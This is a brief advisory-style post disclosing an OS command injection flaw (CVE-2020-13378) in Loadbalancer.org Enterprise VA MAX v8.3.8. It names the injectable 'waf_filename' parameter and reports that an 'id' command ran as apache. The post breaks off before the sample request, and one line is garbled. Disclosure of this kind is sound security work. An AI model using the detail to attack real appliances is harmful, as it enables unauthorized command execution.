# OS Command Injection in Enterprise loadbalancer VA MAX - v8.3.8 and earlier

21 Apr 2020  » [cve](/category/cve)

Vulnerability: OS Command Injection

OS Command Injection in Loadbalancer.org Appliance v8.3.8-134

Vendor: Loadbalancer.org, https://www.loadbalancer.org

Product: ENTERPRISE VA MAX

Version affected: Loadbalancer.org Appliance v8.3.8 as the latest in October 2019

” as per statement on https://www.linkedin.com/company/loadbalancer-org website.

* CVE ID: CVE-2020-13378* CWE ID: CWE-78

##### Proof of Concept

A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted HTTP request. This is exploitable by an authenticated attacker who submits a modified GET request.

Sample GET request, issuing ‘id’ OS command returns ‘uid=48(apache)’

Identified vulnerable parameters: waf\_filename
#### Request:

```
